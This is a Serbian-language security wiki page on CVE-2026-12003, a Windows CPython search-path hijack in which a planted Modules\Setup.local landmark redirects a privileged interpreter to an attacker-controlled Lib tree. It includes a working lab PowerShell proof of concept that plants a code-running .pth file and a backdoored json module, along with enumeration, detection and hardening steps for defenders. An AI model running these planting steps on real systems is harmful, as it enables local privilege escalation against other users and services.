# Windows CPython Build-Landmark i Hijacking `sys.path`

{{#include ../../../banners/hacktricks-training.md}}

Runtime može zadržati relativne putanje koje su bile namenjene samo njegovom build stablu. Ako instalirani privilegovani runtime razreši neku od tih putanja u direktorijum u koji korisnik sa niskim privilegijama može da upisuje, napadač može postaviti očekivani **build landmark** i naterati runtime da veruje alternativnom library prefiksu. CVE-2026-12003 je Windows CPython primer: postavljeni `Modules\Setup.local` može preusmeriti unos standardne biblioteke u `sys.path` bez izmene zaštićene Python instalacije.<sup>[[1]](#references)[[2]](#references)</sup>

## Lanac konstrukcije CPython putanje

Pogođeni Windows build-ovi su kompajlirani sa `VPATH=..\..` i izložili su ga kao `sys._vpath`. Ranljivi fallback u `Modules/getpath.py` tretirao je `VPATH\Modules\Setup.local` kao dokaz da interpreter radi iz source stabla; sledeći tok podataka pretvara tu vrednost iz build vremena u runtime primitiv za search path.<sup>[[1]](#references)[[2]](#references)</sup>

| Faza | Izvedena vrednost za `C:\Program Files\Python314\python.exe` |
| --- | --- |
| Kompajlirana build putanja | `VPATH=..\..` |
| Runtime build landmark | `C:\Program Files\Python314\..\..\Modules\Setup.local` |
| Landmark koji je kreirao napadač | `C:\Modules\Setup.local` |
| Izabrani `build_prefix` | `C:\` |
| Izabrana standardna biblioteka | `C:\Lib` |
| Rezultat | `C:\Lib` pod kontrolom napadača dodaje se u `sys.path` |

Provera je fallback koji se koristi kada `pybuilddir.txt` pored izvršne datoteke ne postoji ili nije čitljiv. Ovo je važno zato što korisnik sa niskim privilegijama možda ne može da menja `C:\Program Files\Python314`, ali i dalje može da kreira nove direktorijume u `C:\`. Kasniji privilegovani proces `python.exe` učitava Python kod koristeći sopstveni access token.<sup>[[1]](#references)[[2]](#references)</sup>

### Preduslovi

Tretirajte ovo kao granicu privilegija samo kada su ispunjeni svi sledeći uslovi:<sup>[[1]](#references)[[2]](#references)</sup>

- Meta je pogođeni **Windows CPython** build; ranjiva logika putanje nije svojstvo Python jezika.
- Direktorijum dobijen razrešavanjem `..\..` iz direktorijuma koji sadrži `python.exe` dozvoljava korisniku sa manjim privilegijama da kreira landmark i `Lib` stablo.
- Korisnik sa višim privilegijama, servis, installer ili nalog za deployment softvera kasnije pokreće taj interpreter.
- Nijedna konfiguracija za izolaciju putanja ne premošćava ranjivi discovery path.

## Enumeracija

Proverite i kompajliranu vrednost i efektivni search path. Izložena vrednost `..\..` predstavlja koristan trag, ali nije dokaz exploitability-ja: takođe razrešite putanju, proverite ACL-ove i potvrdite da bi postavljeni landmark bio izvan zaštićene instalacije.<sup>[[1]](#references)[[2]](#references)</sup>
```powershell
python -c "import os,sys; print(sys.executable); print(getattr(sys,'_vpath',None)); print(*sys.path, sep='\n')"

$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$prefix = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
$prefix
icacls $prefix
```
Ne ograničavajte procenu samo na zvanične installere. Za svaki proizvod koji sadrži `python.exe`, odredite njegov `sys._vpath` u odnosu na stvarni direktorijum izvršne datoteke i proverite ACL-ove na dobijenim lokacijama `Modules` i `Lib`. Dublja instalaciona putanja može da vodi do druge upisive aplikacione ili vendor lokacije, umesto do `C:\`.<sup>[[1]](#references)</sup>

## Tok eksploatacije u laboratoriji

Sledeći laboratorijski PoC oponaša dovoljan deo legitimnog runtime-a ispod izabranog prefiksa da bi se Python inicijalizovao, dodaje izvršivu `.pth` liniju i na kraju kreira landmark. Kreirajte payload pre landmarka kako interpreter ne bi privremeno bio usmeren na nepotpuno stablo biblioteke.<sup>[[1]](#references)</sup>
```powershell
$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$root = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
robocopy /E "$pythonDir\Lib" "$root\Lib" | Out-Null
robocopy /E "$pythonDir\DLLs" "$root\Lib" | Out-Null
New-Item "$root\Lib\site-packages" -ItemType Directory -Force | Out-Null
'import subprocess;subprocess.run(["cmd.exe","/c","whoami > %TEMP%\\py-landmark.txt"],shell=False)' |
Set-Content "$root\Lib\site-packages\audit.pth" -Encoding Ascii
New-Item "$root\Modules" -ItemType Directory -Force | Out-Null
New-Item "$root\Modules\Setup.local" -ItemType File -Force | Out-Null
```
Tokom normalne site inicijalizacije, Python obrađuje `.pth` datoteke u prepoznatim site-packages direktorijumima. Izvršavaju se samo linije koje počinju sa `import` nakon kog sledi razmak, a izvršna naredba mora ostati u jednom fizičkom redu; `python -S` potiskuje automatski `site` import i zato onemogućava ovaj trigger.<sup>[[1]](#references)[[4]](#references)</sup>

### Alternativa pokrenuta import-om

Izvršavanje pri pokretanju nije neophodno. Nakon reprodukovanja legitimnog stabla biblioteke, postavite backdoor u modul koji privilegovana skripta predvidljivo importuje. Na primer, dodavanje koda u ubačeni `Lib\json\__init__.py` izvršava se kada žrtva importuje `json`; izbor pouzdanog, ali ne univerzalno importovanog modula može učiniti trigger manje upadljivim.<sup>[[1]](#references)</sup>
```powershell
'open(r"C:\Windows\Temp\json-import-token.txt","w").write(__import__("subprocess").check_output(["whoami"]).decode())' |
Add-Content "$root\Lib\json\__init__.py" -Encoding Ascii
```
Ova varijanta i dalje nasleđuje token importing procesa, ali zavisi od toga da ciljna aplikacija importuje izmenjeni modul. Očuvajte originalno ponašanje modula prilikom testiranja stvarnog software-a, jer import može da ne uspe pre nego što se predviđeni privilegovani workflow završi.<sup>[[1]](#references)</sup>

## Pre-installation planting

Planting putem search path-a može prethoditi instalaciji. Korisnik sa niskim privilegijama može pripremiti buduće `Lib` stablo i `Modules\Setup.local`, a zatim sačekati da privilegovani software portal, help-desk workflow ili deployment sistem izvrši instalaciju za sve korisnike. Installeri koji pokreću novi interpreter radi instaliranja package-a ili prekompajliranja standardne biblioteke mogu aktivirati payload pod deployment nalogom, bez potrebe da administrator ručno otvori Python.<sup>[[1]](#references)</sup>

Ovo takođe menja pregled deployment-a: proverite writable nadređene direktorijume i postojeće landmark/library direktorijume **pre** instaliranja ili upgrade-a bundled runtime-a, umesto da proveravate samo konačni installation direktorijum nakon deployment-a.<sup>[[1]](#references)</sup>

## Detekcija i hardening

Korisni host pivot-i su neočekivani landmark i library tree, praćeni privilegovanim Python pokretanjem. Tražite `Modules\Setup.local`, `Lib\site-packages\*.pth` na root nivou ili na drugom neuobičajenom mestu, kopirane package-e standardne biblioteke i module čiji se owner ili vreme kreiranja razlikuju od zaštićene instalacije. Povežite njihovo kreiranje od strane standardnog korisnika sa povišenim `python.exe` procesom koji pokreće `cmd.exe`, `powershell.exe`, alate za upravljanje nalozima ili druge neuobičajene child procese.<sup>[[1]](#references)</sup>
```powershell
Get-Item C:\Modules\Setup.local -ErrorAction SilentlyContinue | Format-List FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib\site-packages -Filter *.pth -ErrorAction SilentlyContinue |
Select-Object FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib -Recurse -File -ErrorAction SilentlyContinue |
Get-Acl | Where-Object Owner -notmatch 'TrustedInstaller|Administrators|SYSTEM'
```
Uzvodna ispravka uklanja fallback `VPATH\Modules\Setup.local` i čini `pybuilddir.txt` jedinim indikatorom build-tree-a. Prednost treba dati fiksnom build-u ili per-user instalaciji kojom se upravlja pomoću aktuelnog Python install manager-a. Kada je nadogradnja privremeno nemoguća, zaštitite razrešenog pretka i unapred kreirajte `Modules` sa restriktivnim ACL-ovima; kontrolisani `._pth` fajlovi ili `PYTHONHOME` takođe mogu izmeniti discovery, ali zahtevaju testiranje kompatibilnosti aplikacije.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [Bishop Fox - CVE-2026-12003: Hijacking search-path-a i local privilege escalation u Windows CPython-u](https://bishopfox.com/blog/python-software-foundation-python-3-11-0a3-to-3-15-0b2)
- [2] [CPython issue #151544 - Search paths u source tree-u mogu biti omogućeni bez izmene install direktorijuma](https://github.com/python/cpython/issues/151544)
- [3] [CPython pull request #151545 - Uklanjanje fallback-a `VPATH/Modules/Setup.local`](https://github.com/python/cpython/pull/151545)
- [4] [Python documentation - konfiguracioni fajlovi za `site` path](https://docs.python.org/3/library/site.html)
{{#include ../../../banners/hacktricks-training.md}}
